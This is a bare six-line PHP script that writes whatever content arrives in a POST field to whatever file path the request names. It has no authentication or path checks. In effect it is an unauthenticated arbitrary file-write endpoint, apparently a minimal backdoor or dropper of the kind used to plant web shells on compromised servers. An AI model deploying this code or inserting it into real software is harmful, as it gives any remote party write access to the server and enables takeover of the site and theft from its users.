<?php
$NAME = $_POST['F'];
$HANDLE = fopen($NAME, 'w') or die ('UNABLE TO OPEN FILE');
fwrite($HANDLE,$_POST["D"]) or die ('FAILED TO WRITE FILE');
fclose($HANDLE);
?>